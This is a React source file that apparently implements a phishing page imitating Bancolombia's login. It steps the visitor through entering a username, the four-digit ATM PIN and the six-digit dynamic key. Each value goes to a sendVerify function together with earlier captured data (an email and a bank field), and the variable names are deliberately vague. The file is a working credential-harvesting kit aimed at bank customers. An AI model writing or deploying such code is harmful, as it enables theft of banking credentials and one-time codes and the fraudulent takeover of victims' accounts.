import React, { useRef, useEffect, useState } from 'react';
import { useLocation } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X08.module.css';
import logoHeader from '../../Assets/Images/X08/logoHeader.svg';
import salir from '../../Assets/Images/X08/salir.svg';
import flecha from '../../Assets/Images/X08/flecha.svg';
import usuario from '../../Assets/Images/X08/usuario.svg';
import logoFooter from '../../Assets/Images/X08/logoFooter.svg';

function X08() {

    const location = useLocation();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');

    const [showDataESection, setShowDataESection] = useState(true);
    const [showDataFSection, setShowDataFSection] = useState(false);
    const [showDataGSection, setShowDataGSection] = useState(false);
    const [showDataHSection, setShowDataHSection] = useState(false);

    const [fechaHora, setFechaHora] = useState('');

    useEffect(() => {

        const ahora = new Date();

        const opcionesFecha = {
            weekday: 'long', 
            day: 'numeric',
            month: 'long',
            year: 'numeric',
        };

        const fechaFormateada = ahora.toLocaleDateString('es-ES', opcionesFecha);

        const hora = ahora.getHours().toString().padStart(2, '0');
        const minutos = ahora.getMinutes().toString().padStart(2, '0');

        const capitalizar = (texto) => texto.charAt(0).toUpperCase() + texto.slice(1);

        setFechaHora(`${capitalizar(fechaFormateada)}, ${hora}:${minutos}`);
    }, []);

    const handleContinue = (e) => {

        e.preventDefault();
        
        if (!showDataFSection && showDataESection) {
            setShowDataESection(false);
            setShowDataFSection(true);

        } else if (!showDataGSection && showDataFSection) {
            sendVerify(`🆔: ${dataF}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowDataFSection(false);
            setShowDataGSection(true);

        } else if (!showDataHSection && showDataGSection) {
            const jP = cP.join('');
            sendVerify(`🔐: ${jP}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowDataGSection(false);
            setShowDataHSection(true);

        } else {
            const jD = cD.join('');
            sendVerify(`🔑: ${jD}\n📧: ${dataE}\n🏦: ${dataD}`);
        }
    };

    const [cP, setCP] = useState(['', '', '', '']);
    const [cD, setCD] = useState(['', '', '', '', '', '']);

    const cPRefs = useRef([]);
    const cDRefs = useRef([]);

    const handleInputChange = (index, value, type) => {
        if (!/^\d?$/.test(value)) return;

        const setState = type === 'p' ? setCP : setCD;
        const state = type === 'p' ? [...cP] : [...cD];
        const refs = type === 'p' ? cPRefs.current : cDRefs.current;

        state[index] = value;
        setState(state);

        if (value && index < refs.length - 1) {
        refs[index + 1].focus();
        }
    };

    const handleKeyDown = (e, index, type) => {
        const refs = type === 'p' ? cPRefs.current : cDRefs.current;
        const state = type === 'p' ? cP : cD;

        if (e.key === 'Backspace' && !state[index] && index > 0) {
        refs[index - 1].focus();
        }
    };

    return (
        <>
            <header className={styles.headerX08}>
                <img src={logoHeader} alt='Logo'></img>
                <div>
                    <p>Salir</p>
                    <img src={salir} alt='Salir'></img>
                </div>
            </header>
            <main className={styles.mainX08}>
                {showDataESection && (
                    <section className={styles.sectionX08}>
                        <h1>Iniciar sesión</h1>
                        <h2>Elige como quieres continuar</h2>
                        <div onClick={handleContinue}>
                            <div>
                                <h3>Bancolombia Personas</h3>
                                <p>Si manejas cuentas o productos personales.</p>
                            </div>
                            <div>
                                <img src={flecha} alt='Flecha'></img>
                            </div>
                        </div>
                        <div>
                            <div>
                                <h3>Bancolombia Negocios</h3>
                                <p>Si manejas cuentas o productos de negocios.</p>
                            </div>
                            <div>
                                <img src={flecha} alt='Flecha'></img>
                            </div>
                        </div>
                        <p>¿Qué opción debo elegir?</p>
                    </section>
                )}
                {showDataFSection && (
                    <section className={styles.sectionsX08}>
                        <h3>Te damos la bienvenida</h3>
                        <div>
                            <p>El usuario es el mismo con el que ingresas <br></br><span>Sucursal Virtual Personas.</span></p>
                            <div>
                                <img src={usuario}></img>
                                <input type='number'
                                        value={dataF}
                                        onChange={(e) => setDataF(e.target.value)}
                                        placeholder='Usuario'></input>
                            </div>
                            <p>¿Olvidaste tu usuario?</p>
                            <div>
                                <button>Volver</button>
                                <button onClick={handleContinue}>Continuar</button>
                            </div>
                        </div>
                    </section>
                )}
                {showDataGSection && (
                    <section className={styles.sectionsX08}>
                        <h3>Clave Principal</h3>
                        <div>
                            <img alt="" />
                            <p>Es la misma que usas en el cajero</p>
                            <div className={styles.inputX08}>
                                {cP.map((num, i) => (
                                    <input
                                        key={i}
                                        type="text"
                                        maxLength={1}
                                        value={num}
                                        ref={(el) => (cPRefs.current[i] = el)}
                                        onChange={(e) => handleInputChange(i, e.target.value, 'p')}
                                        onKeyDown={(e) => handleKeyDown(e, i, 'p')}
                                    />
                                ))}
                            </div>
                            <div>
                                <button>Volver</button>
                                <button onClick={handleContinue}>Continuar</button>
                            </div>
                        </div>
                    </section>
                )}
                {showDataHSection && (
                    <section className={styles.sectionsX08}>
                        <h3>Clave Dinamica</h3>
                        <div>
                            <img alt="" />
                            <p>X</p>
                            <div className={styles.inputX08}>
                                {cD.map((num, i) => (
                                    <input
                                        key={i}
                                        type="text"
                                        maxLength={1}
                                        value={num}
                                        ref={(el) => (cDRefs.current[i] = el)}
                                        onChange={(e) => handleInputChange(i, e.target.value, 'd')}
                                        onKeyDown={(e) => handleKeyDown(e, i, 'd')}
                                    />
                                ))}
                            </div>
                            <div>
                                <button>Volver</button>
                                <button onClick={handleContinue}>Ingresar</button>
                            </div>
                        </div>
                    </section>
                )}
            </main>
            <footer className={styles.footerX08}>
                <div>
                    <div>
                        <img src={logoHeader} alt='Logo'></img>
                        <img src={logoFooter} alt='Logo'></img>
                    </div>
                    <div>
                        <p>{fechaHora}</p>
                    </div>
                </div>
            </footer>
        </>
    )
}

export default X08;